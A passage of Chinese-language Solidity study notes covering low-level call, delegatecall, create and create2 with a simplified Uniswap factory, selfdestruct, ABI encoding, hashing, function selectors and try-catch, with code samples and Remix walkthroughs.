_Value}()，其中_Name是合约名，_Address是合约地址，f是目标函数名，_Value是要转的ETH数额（以wei为单位）。\nOtherContract合约的setX函数是payable的，在下面这个例子中我们通过调用setX来往目标合约转账。\n    function setXTransferETH(address otherContract, uint256 x) payable external{\n        OtherContract(otherContract).setX{value: msg.value}(x);\n    }\n\n复制OtherContract合约的地址，填入setXTransferETH函数的参数中，并转入10ETH\n\n转账后，我们可以通过Log事件和getBalance()函数观察目标合约ETH余额的变化。\n\n22.Call\ncall 是address类型的低级成员函数，它用来与其他合约交互。它的返回值为(bool, data)，分别对应call是否成功以及目标函数的返回值。\n\n\ncall是solidity官方推荐的通过触发fallback或receive函数发送ETH的方法。\n\n\n不推荐用call来调用另一个合约，因为当你调用不安全合约的函数时，你就把主动权交给了它。推荐的方法仍是声明合约变量后调用函数，见第21讲：调用其他合约\n\n\n当我们不知道对方合约的源代码或ABI，就没法生成合约变量；这时，我们仍可以通过call调用对方合约的函数。\n\n\ncall的使用规则\n目标合约地址.call(二进制编码);\n其中二进制编码利用结构化编码函数abi.encodeWithSignature获得：\nabi.encodeWithSignature(\"函数签名\", 逗号分隔的具体参数)\n\n函数签名为\"函数名（逗号分隔的参数类型)\"。例如abi.encodeWithSignature(\"f(uint256,address)\", _x, _addr)。\n另外call在调用合约时可以指定交易发送的ETH数额和gas：\n目标合约地址.call{value:发送数额, gas:gas数额}(二进制编码);\n\n(看不懂…举个栗子康康)\n目标合约\n先写一个简单的目标合约OtherContract并部署，代码与第19讲中基本相同，只是多了fallback函数。\ncontract OtherContract {\n    uint256 private _x = 0; // 状态变量x\n    // 收到eth的事件，记录amount和gas\n    event Log(uint amount, uint gas);\n    \n    fallback() external payable{}\n\n    // 返回合约ETH余额\n    function getBalance() view public returns(uint) {\n        return address(this).balance;\n    }\n\n    // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable)\n    function setX(uint256 x) external payable{\n        _x = x;\n        // 如果转入ETH，则释放Log事件\n        if(msg.value &gt; 0){\n            emit Log(msg.value, gasleft());\n        }\n    }\n\n    // 读取x\n    function getX() external view returns(uint x){\n        x = _x;\n    }\n}\n\n这个合约包含一个状态变量x，一个在收到ETH时触发的事件Log，三个函数：\n\n\ngetBalance(): 返回合约ETH余额。\n\n\nsetX(): external payable函数，可以设置x的值，并向合约发送ETH。\n\n\ngetX(): 读取x的值。\n\n\n利用call调用目标合约\n1.Response事件\n我们写一个Call合约来调用目标合约函数。首先定义一个Response事件，输出call返回的success和data，方便我们观察返回值。\n// 定义Response事件，输出call返回的结果success和data\nevent Response(bool success, bytes data);\n\n2.调用setX函数\n我们定义callSetX函数来调用目标合约的setX()，转入msg.value数额的ETH，并释放Response事件输出success和data：\nfunction callSetX(address payable _addr, uint256 x) public payable {\n    // call setX()，同时可以发送ETH\n    (bool success, bytes memory data) = _addr.call{value: msg.value}(\n        abi.encodeWithSignature(\"setX(uint256)\", x)\n    );\n\n    emit Response(success, data); //释放事件\n}\n\n接下来我们调用callSetX把状态变量_x改为5，参数为OtherContract地址和5，由于目标函数setX()没有返回值，因此Response事件输出的data为0x，也就是空。\n\n3.调用getX函数\n下面我们调用getX()函数，它将返回目标合约_x的值，类型为uint256。我们可以利用abi.decode来解码call的返回值data，并读出数值。\nfunction callGetX(address _addr) external returns(uint256){\n    // call getX()\n    (bool success, bytes memory data) = _addr.call(\n        abi.encodeWithSignature(\"getX()\")\n    );\n\n    emit Response(success, data); //释放事件\n    return abi.decode(data, (uint256));\n}\n\n从Response事件的输出，我们可以看到data为0x0000000000000000000000000000000000000000000000000000000000000005。而经过abi.decode，最终返回值为5。\n\n4.调用不存在的函数\n如果我们给call输入的函数不存在于目标合约，那么目标合约的fallback函数会被触发。\nfunction callNonExist(address _addr) external{\n    // call getX()\n    (bool success, bytes memory data) = _addr.call(\n        abi.encodeWithSignature(\"foo(uint256)\")\n    );\n\n    emit Response(success, data); //释放事件\n}\n\n上面例子中，我们call了不存在的foo函数。call仍能执行成功，并返回success，但其实调用的目标合约fallback函数。\n\ncall不是调用合约的推荐方法，因为不安全。但他能让我们在不知道源代码和ABI的情况下调用目标合约，很有用。\n(最后直接贴上所有代码)\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract OtherContract {\n    uint256 private _x = 0; // 状态变量x\n    // 收到eth的事件，记录amount和gas\n    event Log(uint amount, uint gas);\n    \n    fallback() external payable{}\n\n    // 返回合约ETH余额\n    function getBalance() view public returns(uint) {\n        return address(this).balance;\n    }\n\n    // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable)\n    function setX(uint256 x) external payable{\n        _x = x;\n        // 如果转入ETH，则释放Log事件\n        if(msg.value &gt; 0){\n            emit Log(msg.value, gasleft());\n        }\n    }\n\n    // 读取x\n    function getX() external view returns(uint x){\n        x = _x;\n    }\n}\n\n    contract call{\n        function callGetX(address _addr) external returns(uint256){\n    // call getX()\n    (bool success, bytes memory data) = _addr.call(\n        abi.encodeWithSignature(\"getX()\")\n    );\n\n    emit Response(success, data); //释放事件\n    return abi.decode(data, (uint256));\n}\n\n        event Response(bool success, bytes data);\n\n        function callSetX(address payable _addr, uint256 x) public payable {\n    // call setX()，同时可以发送ETH\n    (bool success, bytes memory data) = _addr.call{value: msg.value}(\n        abi.encodeWithSignature(\"setX(uint256)\", x)\n    );\n\n    emit Response(success, data); //释放事件\n}\n    function callNonExist(address _addr) external{\n    // call getX()\n    (bool success, bytes memory data) = _addr.call(\n        abi.encodeWithSignature(\"foo(uint256)\")\n    );\n\n    emit Response(success, data); //释放事件\n}\n    }\n\n23.Delegatecall\ndelegatecall与call类似，是solidity中地址类型的低级成员函数。delegate中是委托/代表的意思，那么delegatecall委托了什么？\n当用户A通过合约B来call合约C的时候，执行的是合约C的函数，语境(Context，可以理解为包含变量和状态的环境)也是合约C的：msg.sender是B的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约C的变量上。\n\n而当用户A通过合约B来delegatecall合约C的时候，执行的是合约C的函数，但是语境仍是合约B的：msg.sender是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约B的变量上。\n\n大家可以这样理解：一个富商把它的资产（状态变量）都交给一个VC代理（目标合约的函数）来打理。执行的是VC的函数，但是改变的是富商的状态。\ndelegatecall语法和call类似，也是：\n目标合约地址.delegatecall(二进制编码);\n\n其中二进制编码利用结构化编码函数abi.encodeWithSignature获得：\nabi.encodeWithSignature(\"函数签名\", 逗号分隔的具体参数)\n\n函数签名为\"函数名（逗号分隔的参数类型)\"。例如abi.encodeWithSignature(\"f(uint256,address)\", _x, _addr)。\n和call不一样，delegatecall在调用合约时可以指定交易发送的gas，但不能指定发送的ETH数额\n\n\n\n\n\n\n\n\n\n注意：delegatecall有安全隐患，使用时要保证当前合约和目标合约的状态变量存储结构相同，并且目标合约安全，不然会造成资产损失。\n什么情况下会用到delegatecall\n目前delegatecall主要有两个应用场景：\n\n\n代理合约（Proxy Contract）：将智能合约的存储合约和逻辑合约分开：代理合约（Proxy Contract）存储所有相关的变量，并且保存逻辑合约的地址；所有函数存在逻辑合约（Logic Contract）里，通过delegatecall执行。当升级时，只需要将代理合约指向新的逻辑合约即可。\n\n\nEIP-2535 Diamonds（钻石）：钻石是一个支持构建可在生产中扩展的模块化智能合约系统的标准。钻石是具有多个实施合同的代理合同。\n\n\ndelegatecall例子\n调用结构：你（A）通过合约B调用目标合约C。\n被调用的合约C\n我们先写一个简单的目标合约C：有两个public变量：num和sender，分别是uint256和address类型；有一个函数，可以将num设定为传入的_num，并且将sender设为msg.sender。\n// 被调用的合约C\ncontract C {\n    uint public num;\n    address public sender;\n\n    function setVars(uint _num) public payable {\n        num = _num;\n        sender = msg.sender;\n    }\n}\n\n发起调用的合约B\n首先，合约B和目标合约C的变量存储布局必须相同，两个变量，并且顺序为num和sender\ncontract B {\n    uint public num;\n    address public sender;\n\n接下来，我们分别用call和delegatecall来调用合约C的setVars函数，更好的理解它们的区别。\ncallSetVars函数通过call来调用setVars。它有两个参数_addr和_num，分别对应合约C的地址和setVars的参数。\n    // 通过call来调用C的setVars()函数，将改变合约C里的状态变量\n    function callSetVars(address _addr, uint _num) external payable{\n        // call setVars()\n        (bool success, bytes memory data) = _addr.call(\n            abi.encodeWithSignature(\"setVars(uint256)\", _num)\n        );\n    }\n\n而delegatecallSetVars函数通过delegatecall来调用setVars。与上面的callSetVars函数相同，有两个参数_addr和_num，分别对应合约C的地址和setVars的参数。\n    // 通过delegatecall来调用C的setVars()函数，将改变合约B里的状态变量\n    function delegatecallSetVars(address _addr, uint _num) external payable{\n        // delegatecall setVars()\n        (bool success, bytes memory data) = _addr.delegatecall(\n            abi.encodeWithSignature(\"setVars(uint256)\", _num)\n        );\n    }\n}\n\n在remix上验证\n1.首先，我们把合约B和C都部署好\n\n2.部署之后，查看C合约状态变量的初始值，B合约的状态变量也是一样。\n\n3.此时，调用合约B中的callSetVars，传入参数为合约C地址和10\n\n4.运行后，合约C中的状态变量将被修改：num被改为10，sender变为合约B的地址\n\n5.接下来，我们调用合约B中的delegatecallSetVars，传入参数为合约C地址和100\n\n6.由于是delegatecall，语境为合约B。在运行后，合约B中的状态变量将被修改：num被改为100，sender变为你的钱包地址。合约C中的状态变量不会被修改。\n\n24.在合约中创建新合约\n在以太坊链上，用户（外部账户，EOA）可以创建智能合约，智能合约同样也可以创建新的智能合约。去中心化交易所uniswap就是利用工厂合约（Factory）创建了无数个币对合约（Pair）。这一讲，我会用简化版的uniswap讲如何通过合约创建合约。\ncreate和create2\n有两种方法可以在合约中创建新合约，create和create2，这里我们讲create，下一讲会介绍create2。\ncreate的用法很简单，就是new一个合约，并传入新合约构造函数所需的参数：\nContract x = new Contract{value: _value}(params)\n\n其中Contract是要创建的合约名，x是合约对象（地址），如果构造函数是payable，可以创建时转入_value数量的ETH，params是新合约构造函数的参数。\n极简Uniswap\nUniswap V2核心合约中包含两个合约：\n\n\nUniswapV2Pair: 币对合约，用于管理币对地址、流动性、买卖。\n\n\nUniswapV2Factory: 工厂合约，用于创建新的币对，并管理币对地址。\n\n\n下面我们用create方法实现一个极简版的Uniswap：Pair币对合约负责管理币对地址，PairFactory工厂合约用于创建新的币对，并管理币对地址。\nPair合约\ncontract Pair{\n    address public factory; // 工厂合约地址\n    address public token0; // 代币1\n    address public token1; // 代币2\n\n    constructor() payable {\n        factory = msg.sender;\n    }\n\n    // called once by the factory at time of deployment\n    function initialize(address _token0, address _token1) external {\n        require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check\n        token0 = _token0;\n        token1 = _token1;\n    }\n}\n\nPair合约很简单，包含3个状态变量：factory，token0和token1。\n构造函数constructor在部署时将factory赋值为工厂合约地址。initialize函数会在Pair合约创建的时候被工厂合约调用一次，将token0和token1更新为币对中两种代币的地址。\n\n\n\n\n\n\n\n\n\n提问：为什么uniswap不在constructor中将token0和token1地址更新好？\n答：因为uniswap使用的是create2创建合约，限制构造函数不能有参数。当使用create时，Pair合约允许构造函数有参数，可以在constructor中将token0和token1地址更新好。\nPairFactory\ncontract PairFactory{\n    mapping(address =&gt; mapping(address =&gt; address)) public getPair; // 通过两个代币地址查Pair地址\n    address[] public allPairs; // 保存所有Pair地址\n\n    function createPair(address tokenA, address tokenB) external returns (address pairAddr) {\n        // 创建新合约\n        Pair pair = new Pair(); \n        // 调用新合约的initialize方法\n        pair.initialize(tokenA, tokenB);\n        // 更新地址map\n        pairAddr = address(pair);\n        allPairs.push(pairAddr);\n        getPair[tokenA][tokenB] = pairAddr;\n        getPair[tokenB][tokenA] = pairAddr;\n    }\n}\n\n工厂合约（PairFactory）有两个状态变量getPair是两个代币地址到币对地址的map，方便根据代币找到币对地址；allPairs是币对地址的数组，存储了所有代币地址。\nPairFactory合约只有一个createPair函数，根据输入的两个代币地址tokenA和tokenB来创建新的Pair合约。其中\n    Pair pair = new Pair(); \n\n就是创建合约的代码，非常简单。大家可以部署好PairFactory合约，然后用下面两个地址作为参数调用createPair，看看创建的币对地址是什么：\nWBNB地址: 0x2c44b726ADF1963cA47Af88B284C06f30380fC78\nBSC链上的PEOPLE地址:\n0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c\n\n在remix上验证\n1.使用WBNB和PEOPLE的地址作为参数调用createPair,得到Pair合约地址：0xD3e2008b4Da2cD6DEAF73471590fF30C86778A48\n\n（刚开始没整出来，加个步骤，复制得到的Pair合约地址，放到At Address里面，同时上面部署合约要改回Pair,点击At Address得到合约）\n\n2.查看Pair合约变量\n\n3.Debug查看create操作码\n\n25.Create2\nCREATE2 操作码使我们在智能合约部署在以太坊网络之前就能预测合约的地址。Uniswap创建Pair合约用的就是CREATE2而不是CREATE。\nCreate如何计算地址\n智能合约可以由其他合约和普通账户利用CREATE操作码创建。 在这两种情况下，新合约的地址都以相同的方式计算：创建者的地址(通常为部署的钱包地址或者合约地址)和nonce(该地址发送交易的总数,对于合约账户是创建的合约总数,每创建一个合约nonce+1))的哈希。\n新地址 = hash(创建者地址, nonce)\n\n创建者地址不会变，但nonce可能会随时间而改变，因此用CREATE创建的合约地址不好预测。\nCreate2如何计算地址\nCREATE2的目的是为了让合约地址独立于未来的事件。不管未来区块链上发生了什么，你都可以把合约部署在事先计算好的地址上。用CREATE2创建的合约地址由4个部分决定：\n\n\n0xFF：一个常数，避免和CREATE冲突\n\n\n创建者地址\n\n\nsalt（盐）：一个创建者给定的数值\n\n\n待部署合约的字节码（bytecode）\n\n\n新地址 = hash(\"0xFF\",创建者地址, salt, bytecode)\n\nCREATE2 确保，如果创建者使用 CREATE2 和提供的 salt 部署给定的合约bytecode，它将存储在 新地址 中。\n如何使用Create2\nCREATE2的用法和之前讲的Create类似，同样是new一个合约，并传入新合约构造函数所需的参数，只不过要多传一个salt参数：\nContract x = new Contract{salt: _salt, value: _value}(params)\n\n其中Contract是要创建的合约名，x是合约对象（地址），_salt是指定的盐；如果构造函数是payable，可以创建时转入_value数量的ETH，params是新合约构造函数的参数。\n极简Uniswap2\nPair\ncontract Pair{\n    address public factory; // 工厂合约地址\n    address public token0; // 代币1\n    address public token1; // 代币2\n\n    constructor() payable {\n        factory = msg.sender;\n    }\n\n    // called once by the factory at time of deployment\n    function initialize(address _token0, address _token1) external {\n        require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check\n        token0 = _token0;\n        token1 = _token1;\n    }\n}\n\nPair合约很简单，包含3个状态变量：factory，token0和token1。\n构造函数constructor在部署时将factory赋值为工厂合约地址。initialize函数会在Pair合约创建的时候被工厂合约调用一次，将token0和token1更新为币对中两种代币的地址。\nPairFactory2\ncontract PairFactory2{\n        mapping(address =&gt; mapping(address =&gt; address)) public getPair; // 通过两个代币地址查Pair地址\n        address[] public allPairs; // 保存所有Pair地址\n\n        function createPair2(address tokenA, address tokenB) external returns (address pairAddr) {\n            require(tokenA != tokenB, 'IDENTICAL_ADDRESSES'); //避免tokenA和tokenB相同产生的冲突\n            // 计算用tokenA和tokenB地址计算salt\n            (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序\n            bytes32 salt = keccak256(abi.encodePacked(token0, token1));\n            // 用create2部署新合约\n            Pair pair = new Pair{salt: salt}(); \n            // 调用新合约的initialize方法\n            pair.initialize(tokenA, tokenB);\n            // 更新地址map\n            pairAddr = address(pair);\n            allPairs.push(pairAddr);\n            getPair[tokenA][tokenB] = pairAddr;\n            getPair[tokenB][tokenA] = pairAddr;\n        }\n    }\n\n工厂合约（PairFactory2）有两个状态变量getPair是两个代币地址到币对地址的map，方便根据代币找到币对地址；allPairs是币对地址的数组，存储了所有币对地址。\nPairFactory2合约只有一个createPair2函数，使用CREATE2根据输入的两个代币地址tokenA和tokenB来创建新的Pair合约。其中\n    Pair pair = new Pair{salt: salt}(); \n\n就是利用CREATE2创建合约的代码，非常简单，而salt为token1和token2的hash：\n            bytes32 salt = keccak256(abi.encodePacked(token0, token1));\n\n事先计算Pair地址\n        // 提前计算pair合约地址\n        function calculateAddr(address tokenA, address tokenB) public view returns(address predictedAddress){\n            require(tokenA != tokenB, 'IDENTICAL_ADDRESSES'); //避免tokenA和tokenB相同产生的冲突\n            // 计算用tokenA和tokenB地址计算salt\n            (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序\n            bytes32 salt = keccak256(abi.encodePacked(token0, token1));\n            // 计算合约地址方法 hash()\n            predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(\n                bytes1(0xff),\n                address(this),\n                salt,\n                keccak256(type(Pair).creationCode)\n            )))));\n        }\n\n我们写了一个calculateAddr函数来事先计算tokenA和tokenB将会生成的Pair地址。通过它，我们可以验证我们事先计算的地址和实际地址是否相同。\n大家可以部署好PairFactory2合约，然后用下面两个地址作为参数调用createPair2，看看创建的币对地址是什么，是否与事先计算的地址一样：\nWBNB地址: 0x2c44b726ADF1963cA47Af88B284C06f30380fC78\nBSC链上的PEOPLE地址:\n0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c\n\n在remix上验证\n\n\n首先用WBNB和PEOPLE的地址哈希作为salt来计算出Pair合约的地址\n\n\n调用PairFactory2.createPair2传入参数为WBNB和PEOPLE的地址，获取出创建的pair合约地址\n\n\n对比合约地址\n\n\n\ncreate2的实际应用场景\n\n\n交易所为新用户预留创建钱包合约地址。\n\n\n由 CREATE2 驱动的 factory 合约，在uniswapV2中交易对的创建是在 Factory中调用create2完成。这样做的好处是: 它可以得到一个确定的pair地址, 使得 Router中就可以通过 (tokenA, tokenB) 计算出pair地址, 不再需要执行一次 Factory.getPair(tokenA, tokenB) 的跨合约调用。\n\n\n26.删除合约\nselfdestruct\nselfdestruct命令可以用来删除智能合约，并将该合约剩余ETH转到指定地址。selfdestruct是为了应对合约出错的极端情况而设计的。它最早被命名为suicide（自杀），但是这个词太敏感。为了保护抑郁的程序员，改名为selfdestruct。\n如何使用selfdestruct\nselfdestruct使用起来非常简单：\nselfdestruct(_addr)；\n\n其中_addr是接收合约中剩余ETH的地址。\n例子\ncontract DeleteContract {\n\n    uint public value = 10;\n\n    constructor() payable {}\n\n    receive() external payable {}\n\n    function deleteContract() external {\n        // 调用selfdestruct销毁合约，并把剩余的ETH转给msg.sender\n        selfdestruct(payable(msg.sender));\n    }\n\n    function getBalance() external view returns(uint balance){\n        balance = address(this).balance;\n    }\n}\n\n在DeleteContract合约中，我们写了一个public状态变量value，两个函数：getBalance()用于获取合约ETH余额，deleteContract()用于自毁合约，并把ETH转入给发起人。\n部署好合约后，我们向DeleteContract合约转入1 ETH。这时，getBalance()会返回1 ETH，value变量是10。\n当我们调用deleteContract()函数，合约将自毁，所有变量都清空，此时value变为默认值0，getBalance()也返回空值。\n注意事项\n\n\n对外提供合约销毁接口时，最好设置为只有合约所有者可以调用，可以使用函数修饰符onlyOwner进行函数声明。\n\n\n当合约被销毁后与智能合约的交互也能成功，并且返回0。\n\n\n当合约中有selfdestruct功能时常常会带来安全问题和信任问题，合约中的Selfdestruct功能会为攻击者打开攻击向量(例如使用selfdestruct向一个合约频繁转入token进行攻击，这将大大节省了GAS的费用，虽然很少人这么做)，此外，此功能还会降低用户对合约的信心。\n\n\n27.ABI编码解码\nABI (Application Binary Interface，应用二进制接口)是与以太坊智能合约交互的标准。数据基于他们的类型编码；并且由于编码后不包含类型信息，解码时需要注明它们的类型。\nSolidity中，ABI编码有4个函数：abi.encode, abi.encodePacked, abi.encodeWithSignature, abi.encodeWithSelector。而ABI解码有1个函数：abi.decode，用于解码abi.encode的数据。\nABI编码\n我们将用编码4个变量，他们的类型分别是uint256, address, string, uint256[2]：\n    uint x = 10;\n    address addr = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71;\n    string name = \"0xAA\";\n    uint[2] array = [5, 6]; \n\nabi.encode\n将给定参数利用ABI规则编码。ABI被设计出来跟智能合约交互，他将每个参数填充为32字节的数据，并拼接在一起。如果你要和合约交互，你要用的就是abi.encode。\n    function encode() public view returns(bytes memory result) {\n        result = abi.encode(x, addr, name, array);\n    }\n\n编码的结果为0x000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000，由于abi.encode将每个数据都填充为32字节，中间有很多0。\nabi.encodePacked\n将给定参数根据其所需最低空间编码。它类似 abi.encode，但是会把其中填充的很多0省略。比如，只用1字节来编码uint类型。当你想省空间，并且不与合约交互的时候，可以使用abi.encodePacked，例如算一些数据的hash时。\n    function encodePacked() public view returns(bytes memory result) {\n        result = abi.encodePacked(x, addr, name, array);\n    }\n\n编码的结果为0x000000000000000000000000000000000000000000000000000000000000000a7a58c0be72be218b41c608b7fe7c5bb630736c713078414100000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000000006，由于abi.encodePacked对编码进行了压缩，长度比abi.encode短很多。\nabi.encodeWithSignature\n与abi.encode功能类似，只不过第一个参数为函数签名，比如\"foo(uint256,address)\"。当调用其他合约的时候可以使用。\n    function encodeWithSignature() public view returns(bytes memory result) {\n        result = abi.encodeWithSignature(\"foo(uint256,address,string,uint256[2])\", x, addr, name, array);\n    }\n\n编码的结果为0xe87082f1000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000，等同于在abi.encode编码结果前加上了4字节的函数选择器说明。 说明: 函数选择器就是通过函数名和参数进行签名处理(Keccak–Sha3)来标识函数，可以用于不同合约之间的函数调用\nabi.encodeWithSelector\n与abi.encodeWithSignature功能类似，只不过第一个参数为函数选择器，为函数签名Keccak哈希的前4个字节。\n    function encodeWithSelector() public view returns(bytes memory result) {\n        result = abi.encodeWithSelector(bytes4(keccak256(\"foo(uint256,address,string,uint256[2])\")), x, addr, name, array);\n    }\n\n编码的结果为0xe87082f1000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000，与abi.encodeWithSignature结果一样。\nABI解码\nabi.decode\nabi.decode用于解码abi.encode生成的二进制编码，将它还原成原本的参数。\n    function decode(bytes memory data) public pure returns(uint dx, address daddr, string memory dname, uint[2] memory darray) {\n        (dx, daddr, dname, darray) = abi.decode(data, (uint, address, string, uint[2]));\n    }\n\n我们将abi.encode的二进制编码输入给decode，将解码出原来的参数：\n\nABI的使用场景\n1.在合约开发中，ABI常配合call来实现对合约的底层调用。\n    bytes4 selector = contract.getValue.selector;\n\n    bytes memory data = abi.encodeWithSelector(selector, _x);\n    (bool success, bytes memory returnedData) = address(contract).staticcall(data);\n    require(success);\n\n    return abi.decode(returnedData, (uint256));\n\n2.ethers.js中常用ABI实现合约的导入和函数调用。\n    const wavePortalContract = new ethers.Contract(contractAddress, contractABI, signer);\n    /*\n        * Call the getAllWaves method from your Smart Contract\n        */\n    const waves = await wavePortalContract.getAllWaves();\n\n3.对不开源合约进行反编译后，某些函数无法查到函数签名，可通过ABI进行调用。\n\n\n0x533ba33a() 是一个反编译后显示的函数，只有函数编码后的结果，并且无法查到函数签名\n\n\n\n这种情况无法通过构造interface接口或contract来进行调用\n\n\n\n这种情况下，就可以通过ABI函数选择器来调用\n    bytes memory data = abi.encodeWithSelector(bytes4(0x533ba33a));\n\n    (bool success, bytes memory returnedData) = address(contract).staticcall(data);\n    require(success);\n\n    return abi.decode(returnedData, (uint256));\n\n28.Hash\n哈希函数（hash function）是一个密码学概念，它可以将任意长度的消息转换为一个固定长度的值，这个值也称作哈希（hash）。\nHash的性质\n一个好的哈希函数应该具有以下几个特性：\n\n\n单向性：从输入的消息到它的哈希的正向运算简单且唯一确定，而反过来非常难，只能靠暴力枚举。\n\n\n灵敏性：输入的消息改变一点对它的哈希改变很大。\n\n\n高效性：从输入的消息到哈希的运算高效。\n\n\n均一性：每个哈希值被取到的概率应该基本相等。\n\n\n抗碰撞性：\n\n弱抗碰撞性：给定一个消息x，找到另一个消息x'使得hash(x) = hash(x')是困难的。\n强抗碰撞性：找到任意x和x'，使得hash(x) = hash(x')是困难的。\n\n\n\nHash的应用\n\n\n生成数据唯一标识\n\n\n加密签名\n\n\n安全加密\n\n\nKeccak256\nKeccak256函数是solidity中最常用的哈希函数，用法非常简单：\n哈希 = keccak256(数据);\n\nKeccak256和sha3\n\n\nsha3由keccak标准化而来，在很多场合下Keccak和SHA3是同义词，但在2015年8月SHA3最终完成标准化时，NIST调整了填充算法。所以SHA3就和keccak计算的结果不一样，这点在实际开发中要注意。\n\n\n以太坊在开发的时候sha3还在标准化中，所以采用了keccak，所以Ethereum和Solidity智能合约代码中的SHA3是指Keccak256，而不是标准的NIST-SHA3，为了避免混淆，直接在合约代码中写成Keccak256是最清晰的。\n\n\n生成数据唯一标志\n我们可以利用keccak256来生成一些数据的唯一标识。比如我们有几个不同类型的数据：uint，string，address，我们可以先用abi.encodePacked方法将他们打包编码，然后再用keccak256来生成唯一标识：\n    function hash(\n        uint _num,\n        string memory _string,\n        address _addr\n    ) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(_num, _string, _addr));\n    }\n\n弱抗碰撞性\n我们用keccak256演示一下之前讲到的弱抗碰撞性，即给定一个消息x，找到另一个消息x'使得hash(x) = hash(x')是困难的。\n我们给定一个消息0xAA，试图去找另一个消息，使得它们的哈希值相等：\n    // 弱抗碰撞性\n    function weak(\n        string memory string1\n    )public view returns (bool){\n        return keccak256(abi.encodePacked(string1)) == _msg;\n    }\n\n（大家可以试个10次，看看能不能幸运的碰撞上。）\n强抗碰撞性\n我们用keccak256演示一下之前讲到的强抗碰撞性，即找到任意不同的x和x'，使得hash(x) = hash(x')是困难的。\n我们构造一个函数strong，接收两个不同的string参数string1和string2，然后判断它们的哈希是否相同：\n    // 强抗碰撞性\n    function strong(\n        string memory string1,\n        string memory string2\n    )public pure returns (bool){\n        return keccak256(abi.encodePacked(string1)) == keccak256(abi.encodePacked(string2));\n    }\n\n（大家可以试个10次，看看能不能幸运的碰撞上。）\n29.选择器\nselector\n当我们调用智能合约时，本质上是向目标合约发送了一段calldata，在remix中发送一次交易后，可以在详细信息中看见input即为此次交易的calldata\n\n发送的calldata中前4个字节是selector（函数选择器）。\nmsg.data\nmsg.data是solidity中的一个全局变量，值为完整的calldata（调用函数时传入的数据）。\n在下面的代码中，我们可以通过Log事件来输出调用mint函数的calldata：\n    // event 返回msg.data\n    event Log(bytes data);\n\n    function mint(address to) external{\n        emit Log(msg.data);\n    }\n\n当参数为0x2c44b726ADF1963cA47Af88B284C06f30380fC78时，输出的calldata为\n0x6a6278420000000000000000000000002c44b726adf1963ca47af88b284c06f30380fc78\n\n这段很乱的字节码可以分成两部分：\n前4个字节为函数选择器selector：\n0x6a627842\n\n后面32个字节为输入的参数：\n0x0000000000000000000000002c44b726adf1963ca47af88b284c06f30380fc78\n\n其实calldata就是告诉智能合约，我要调用哪个函数，以及参数是什么。\nmethod id、selector和函数签名\nmethod id定义为函数签名的Keccak哈希后的前4个字节，当selector与method id相匹配时，即表示调用该函数，那么函数签名是什么？\n其实在第21讲中，我们简单介绍了函数签名，为\"函数名（逗号分隔的参数类型)\"。举个例子，上面代码中mint的函数签名为\"mint(address)\"。在同一个智能合约中，不同的函数有不同的函数签名，因此我们可以通过函数签名来确定要调用哪个函数。\n注意：在函数签名中，uint和int要写为uint256和int256。\n我们写一个函数，来验证mint函数的method id是否为0x6a627842。大家可以运行下面的函数，看看结果。\n    function mintSelector() external pure returns(bytes4 mSelector){\n        return bytes4(keccak256(\"mint(address)\"));\n    }\n\n结果正是0x6a627842：\n\n使用selector\n我们可以利用selector来调用目标函数。例如我想调用mint函数，我只需要利用abi.encodeWithSelector将mint函数的method id作为selector和参数打包编码，传给call函数：\n    function callWithSignature() external returns(bool, bytes memory){\n        (bool success, bytes memory data) = address(this).call(abi.encodeWithSelector(0x6a627842, \"0x2c44b726ADF1963cA47Af88B284C06f30380fC78\"));\n        return(success, data);\n    }\n\n在日志中，我们可以看到mint函数被成功调用，并输出Log事件。\n\n30.Try Catch\ntry-catch是现代编程语言几乎都有的处理异常的一种标准方式，solidity0.6版本也添加了它。\ntry-catch\n在solidity中，try-catch只能被用于**external函数或创建合约时constructor（被视为external函数）的调用**。基本语法如下：\n        try externalContract.f() {\n            // call成功的情况下 运行一些代码\n        } catch {\n            // call失败的情况下 运行一些代码\n        }\n\n其中externalContract.f()是某个外部合约的函数调用，try模块在调用成功的情况下运行，而catch模块则在调用失败时运行。\n同样可以使用this.f()来替代externalContract.f()，this.f()也被视作为外部调用，但不可在构造函数中使用，因为此时合约还未创建。\n如果调用的函数有返回值，那么必须在try之后声明returns(returnType val)，并且在try模块中可以使用返回的变量；如果是创建合约，那么返回值是新创建的合约变量。\n        try externalContract.f() returns(returnType val){\n            // call成功的情况下 运行一些代码\n        } catch {\n            // call失败的情况下 运行一些代码\n        }\n\n另外，catch模块支持捕获特殊的异常原因：\n        try externalContract.f() returns(returnType){\n            // call成功的情况下 运行一些代码\n        } catch Error(string memory reason) {\n            // 捕获失败的 revert() 和 require()\n        } catch (bytes memory reason) {\n            // 捕获失败的 assert()\n        